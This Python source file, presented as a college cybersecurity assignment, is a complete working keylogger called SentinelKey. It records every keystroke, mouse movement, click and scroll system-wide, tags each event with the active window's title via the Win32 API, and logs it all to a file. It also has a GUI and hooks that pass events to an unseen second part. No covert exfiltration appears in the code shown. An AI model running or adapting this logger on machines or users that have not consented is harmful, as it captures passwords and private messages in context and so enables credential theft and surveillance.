"""
sentinel_key.py â€” PART 1: Global keystroke + mouse logger with window tracking.

Captures EVERY keyboard and mouse event system-wide and logs which application
window is active when each event occurs.

Events captured:
  Window    â€” active application name + title whenever focus changes
  Keyboard  â€” every key press and release
  Mouse     â€” every movement coordinate, every click, every scroll tick

College cybersecurity assignment â€” run only on systems you own.
"""

import os
import sys
import ctypes
import ctypes.wintypes
import threading
import time
from datetime import datetime

from pynput import keyboard, mouse
from pynput.keyboard import Key

import config

# â”€â”€ Globals â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
_running         = False
_paused          = False
_waiting_for_esc = config.START_ON_ESC
_write_lock      = threading.Lock()

total_keys   = 0
total_mouse  = 0

# Active window tracking
_current_window = ""
_current_window_lock = threading.Lock()

# GUI references
_root         = None
_feed_widget  = None
_status_label = None
_win_label    = None      # shows current active window in GUI

# External hooks â€” main.py patches these to forward events to Part 2
on_key_event_hook   = None
on_mouse_event_hook = None


# â”€â”€ Timestamp â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def _ts() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]


# â”€â”€ File write â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def _write(line: str) -> None:
    with _write_lock:
        try:
            with open(config.KEYLOG_FILE, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except OSError:
            pass


def _init_log() -> None:
    with _write_lock:
        with open(config.KEYLOG_FILE, "w", encoding="utf-8") as f:
            f.write("SENTINELKEY â€” PART 1: COMPLETE INPUT LOG\n")
            f.write(f"Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("Captures: Window focus + ALL keystrokes + ALL mouse events\n")
            f.write("=" * 70 + "\n")


# â”€â”€ Active window detection (Windows API) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def _get_active_window() -> str:
    """Return the title of the foreground window using the Win32 API."""
    try:
        hwnd   = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        if length == 0:
            return ""
        buf = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value.strip() or ""
    except Exception:
        return ""


def _window_watcher() -> None:
    """
    Background daemon thread.
    Polls the foreground window every 200 ms.  Whenever the window title
    changes, writes a [WINDOW] marker to the log and updates the GUI banner.
    This means every keystroke block in the log is preceded by which app
    and which page/document the user was typing in.
    """
    global _current_window

    while True:
        if _running and not _paused and not _waiting_for_esc:
            win = _get_active_window()
            if win and win != _current_window:
                with _current_window_lock:
                    _current_window = win
                _write(f"[{_ts()}] [WINDOW] â–¶ {win}")
                _gui_append(f"\nâ”€â”€ WINDOW: {win} â”€â”€\n", "window")
                if _win_label:
                    try:
                        _win_label.configure(text=f"Active: {win[:80]}")
                    except Exception:
                        pass
        time.sleep(0.2)


# â”€â”€ GUI helper â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def _gui_append(text: str, tag: str = "") -> None:
    if _feed_widget is None:
        return
    try:
        _feed_widget.configure(state="normal")
        _feed_widget.insert("end", text, tag or ())
        _feed_widget.see("end")
        _feed_widget.configure(state="disabled")
    except Exception:
        pass


# â”€â”€ Keyboard callbacks â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def _on_press(key) -> bool | None:
    global _running, _waiting_for_esc, _paused, total_keys

    if _waiting_for_esc:
        if key == Key.esc:
            _waiting_for_esc = False
            _running = True
            _write(f"[{_ts()}] [SYSTEM] Logging started (ESC pressed)")
            _gui_append("[SYSTEM] Logging started.\n", "info")
        return None

    if not _running or _paused:
        return None

    if key == Key.esc and config.STOP_KEY == "esc":
        _running = False
        _write(f"[{_ts()}] [SYSTEM] Logging stopped (ESC pressed)")
        _gui_append("[SYSTEM] Stopped.\n", "info")
        if _status_label:
            try:
                _status_label.configure(text="â— STOPPED", fg="#f85149")
            except Exception:
                pass
        return False

    if on_key_event_hook:
        try:
            on_key_event_hook(key)
        except Exception:
            pass

    if hasattr(key, "char") and key.char is not None:
        ks = key.char
    else:
        name = key.name if hasattr(key, "name") else str(key)
        ks = f"[{name.upper()}]"

    total_keys += 1

    # Include current window in every key log line
    with _current_window_lock:
        win = _current_window
    _write(f"[{_ts()}] KEY_PRESS   {ks:<20} | window={win}")

    # GUI
    if key == Key.enter:
        _gui_append("[ENTER]\n", "special")
    elif key == Key.tab:
        _gui_append("[TAB] ", "special")
    elif key == Key.backspace:
        _gui_append("[BKSP]", "special")
    elif key == Key.space:
        _gui_append(" ")
    elif hasattr(key, "char") and key.char:
        _gui_append(key.char)
    else:
        n = key.name.upper() if hasattr(key, "name") else str(key)
        _gui_append(f"[{n}]", "special")

    return None


def _on_release(key) -> None:
    if not _running or _paused or _waiting_for_esc:
        return
    if hasattr(key, "char") and key.char is not None:
        ks = key.char
    else:
        name = key.name if hasattr(key, "name") else str(key)
        ks = f"[{name.upper()}]"
    with _current_window_lock:
        win = _current_window
    _write(f"[{_ts()}] KEY_RELEASE {ks:<20} | window={win}")


# â”€â”€ Mouse callbacks â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def _on_move(x: int, y: int) -> None:
    global total_mouse
    if not _running or _paused or _waiting_for_esc:
        return
    total_mouse += 1
    with _current_window_lock:
        win = _current_window
    _write(f"[{_ts()}] MOUSE_MOVE   x={x:<6} y={y:<6} | window={win}")
    if total_mouse % 5 == 0:
        _gui_append(f"[MOV] ({x},{y})\n", "mouse")


def _on_click(x: int, y: int, button, pressed: bool) -> None:
    global total_mouse
    if not _running or _paused or _waiting_for_esc:
        return
    total_mouse += 1
    action = "PRESS  " if pressed else "RELEASE"
    btn    = str(button).replace("Button.", "")
    with _current_window_lock:
        win = _current_window
    _write(f"[{_ts()}] MOUSE_CLICK  {action}  btn={btn}  x={x}  y={y}  | window={win}")
    _gui_append(f"[CLK] {btn} {'â†“' if pressed else 'â†‘'} ({x},{y})\n", "mouse")

    if on_mouse_event_hook and pressed:
        try:
            on_mouse_event_hook(f"CLICK {btn} ({x},{y})")
        except Exception:
            pass


def _on_scroll(x: int, y: int, dx: int, dy: int) -> None:
    global total_mouse
    if not _running or _paused or _waiting_for_esc:
        return
    total_mouse += 1
    direction = "UP" if dy > 0 else "DOWN"
    with _current_window_lock:
        win = _current_window
    _write(f"[{_ts()}] MOUSE_SCROLL {direction}  x={x}  y={y}  | window={win}")
    _gui_append(f"[SCR] {direction} ({x},{y})\n", "mouse")


# â”€â”€ GUI â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def _build_gui() -> None:
    global _root, _feed_widget, _status_label, _win_label, _running, _paused

    import tkinter as tk
    from tkinter.scrolledtext import ScrolledText

    BG   = "#0d1117"
    BG2  = "#161b22"
    FG   = "#e6edf3"
    GRN  = "#3fb950"
    YEL  = "#e3b341"
    RED  = "#f85149"
    BLU  = "#58a6ff"
    PRP  = "#bc8cff"   # purple for window banners
    DIM  = "#8b949e"

    _root = tk.Tk()
    _root.title("SentinelKey â€” Full Input Capture")
    _root.geometry("960x600")
    _root.configure(bg=BG)

    # â”€â”€ Header â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    hdr = tk.Frame(_root, bg=BG2)
    hdr.pack(fill="x")
    tk.Label(hdr, text="  SentinelKey â€” Keystroke, Mouse & Window Tracker",
             font=("Segoe UI", 13, "bold"), fg=BLU, bg=BG2).pack(side="left", pady=10)
    _status_label = tk.Label(
        hdr,
        text="â— WAITING" if config.START_ON_ESC else "â— CAPTURING",
        font=("Segoe UI", 10, "bold"),
        fg=YEL if config.START_ON_ESC else GRN,
        bg=BG2,
    )
    _status_label.pack(side="right", padx=16)
    tk.Frame(_root, bg="#30363d", height=1).pack(fill="x")

    # â”€â”€ Active window banner â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    win_frame = tk.Frame(_root, bg="#0e1825")
    win_frame.pack(fill="x", padx=0, pady=0)
    tk.Label(win_frame, text="  ACTIVE APP:",
             font=("Consolas", 9, "bold"), fg=DIM, bg="#0e1825").pack(side="left", padx=(8, 4), pady=4)
    _win_label = tk.Label(win_frame, text="(detecting...)",
                          font=("Consolas", 9, "bold"), fg=PRP, bg="#0e1825", anchor="w")
    _win_label.pack(side="left", pady=4, fill="x", expand=True)
    tk.Frame(_root, bg="#30363d", height=1).pack(fill="x")

    # â”€â”€ Stats bar â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    stats_frame = tk.Frame(_root, bg=BG2)
    stats_frame.pack(fill="x", padx=8, pady=2)
    _keys_var  = tk.StringVar(value="Keys: 0")
    _mouse_var = tk.StringVar(value="Mouse: 0")
    tk.Label(stats_frame, textvariable=_keys_var,
             font=("Consolas", 9), fg=GRN, bg=BG2).pack(side="left", padx=8)
    tk.Label(stats_frame, textvariable=_mouse_var,
             font=("Consolas", 9), fg=BLU, bg=BG2).pack(side="left", padx=8)
    tk.Label(stats_frame, text=f"â†’ {os.path.abspath(config.KEYLOG_FILE)}",
             font=("Consolas", 8), fg=DIM, bg=BG2).pack(side="right", padx=8)

    def _tick():
        try:
            _keys_var.set(f"Keys: {total_keys}")
            _mouse_var.set(f"Mouse: {total_mouse}")
            _root.after(500, _tick)
        except Exception:
            pass
    _tick()

    # â”€â”€ Controls â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    ctrl = tk.Frame(_root, bg=BG)
    ctrl.pack(fill="x", padx=8, pady=4)

    def _toggle_pause():
        global _paused
        _paused = not _paused
        _status_label.configure(
            text="â— PAUSED" if _paused else "â— CAPTURING",
            fg=YEL if _paused else GRN,
        )
        _pause_btn.configure(text="Resume" if _paused else "Pause")

    def _clear():
        _feed_widget.configure(state="normal")
        _feed_widget.delete("1.0", "end")
        _feed_widget.configure(state="disabled")

    def _stop():
        global _running
        _running = False
        _write(f"[{_ts()}] [SYSTEM] Stopped via GUI")
        _status_label.configure(text="â— STOPPED", fg=RED)
        _gui_append("\n[SYSTEM] Logging stopped.\n", "info")

    def _on_close():
        global _running
        _running = False
        _write(f"[{_ts()}] [SYSTEM] Stopped (window closed)")
        _root.destroy()

    _pause_btn = tk.Button(ctrl, text="Pause", command=_toggle_pause,
                           bg="#30363d", fg=FG, font=("Segoe UI", 9),
                           relief="flat", padx=12, pady=5, cursor="hand2")
    _pause_btn.pack(side="left", padx=(0, 4))

    tk.Button(ctrl, text="Clear Feed", command=_clear,
              bg="#30363d", fg=FG, font=("Segoe UI", 9),
              relief="flat", padx=12, pady=5, cursor="hand2").pack(side="left", padx=(0, 4))

    tk.Button(ctrl, text="Open Log", command=lambda: os.startfile(
              os.path.abspath(config.KEYLOG_FILE))
              if os.path.exists(config.KEYLOG_FILE) else None,
              bg="#30363d", fg=BLU, font=("Segoe UI", 9),
              relief="flat", padx=12, pady=5, cursor="hand2").pack(side="left")

    tk.Button(ctrl, text="  STOP  ", command=_stop,
              bg=RED, fg=FG, font=("Segoe UI", 10, "bold"),
              relief="flat", padx=14, pady=5, cursor="hand2").pack(side="right")

    # â”€â”€ Feed â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    feed_frame = tk.Frame(_root, bg=BG)
    feed_frame.pack(fill="both", expand=True, padx=8, pady=(0, 8))

    _feed_widget = ScrolledText(
        feed_frame, wrap="word",
        font=("Consolas", 10),
        bg="#010409", fg=FG,
        insertbackground=GRN,
        relief="flat", state="disabled",
        padx=6, pady=6,
    )
    _feed_widget.pack(fill="both", expand=True)
    _feed_widget.tag_configure("special", foreground=YEL)
    _feed_widget.tag_configure("mouse",   foreground=BLU)
    _feed_widget.tag_configure("info",    foreground=GRN)
    _feed_widget.tag_configure("window",  foreground=PRP,
                                font=("Consolas", 10, "bold"))

    _gui_append(f"[SYSTEM] Logging â†’ {os.path.abspath(config.KEYLOG_FILE)}\n", "info")
    _gui_append("[SYSTEM] Window, key and mouse events all captured.\n", "info")
    if config.START_ON_ESC:
        _gui_append("[SYSTEM] Press ESC to begin.\n", "info")
    else:
        _gui_append("[SYSTEM] Press ESC to stop.\n", "info")

    _root.protocol("WM_DELETE_WINDOW", _on_close)
    _root.mainloop()


# â”€â”€ Console fallback â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def _run_console() -> None:
    global _running
    print("=" * 60)
    print("  SentinelKey â€” Full Input Capture (console mode)")
    print(f"  Log: {os.path.abspath(config.KEYLOG_FILE)}")
    if config.START_ON_ESC:
        print("  Press ESC to START")
    else:
        print("  Capturing NOW â€” press ESC to stop")
    print("=" * 60)
    try:
        while _running or _waiting_for_esc:
            time.sleep(0.05)
    except KeyboardInterrupt:
        _running = False
        _write(f"[{_ts()}] [SYSTEM] Stopped (Ctrl+C)")


# â”€â”€ Entry point â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def main() -> None:
    global _running

    _init_log()

    if not config.START_ON_ESC:
        _running = True
        _write(f"[{_ts()}] [SYSTEM] Logging started immediately")

    # Window watcher thread
    wt = threading.Thread(target=_window_watcher, daemon=True, name="WindowWatcher")
    wt.start()

    # pynput listeners
    kb_listener = keyboard.Listener(on_press=_on_press, on_release=_on_release)
    kb_listener.daemon = True
    kb_listener.start()

    ms_listener = mouse.Listener(
        on_move=_on_move,
        on_click=_on_click,
        on_scroll=_on_scroll,
    )
    ms_listener.daemon = True
    ms_listener.start()

    use_gui = config.USE_GUI
    if use_gui:
        try:
            import tkinter  # noqa: F401
        except ImportError:
            use_gui = False

    if use_gui:
        _build_gui()
    else:
        _run_console()

    kb_listener.stop()
    ms_listener.stop()
    _write(f"[{_ts()}] [SYSTEM] Done â€” keys={total_keys}  mouse={total_mouse}")


if __name__ == "__main__":
    main()

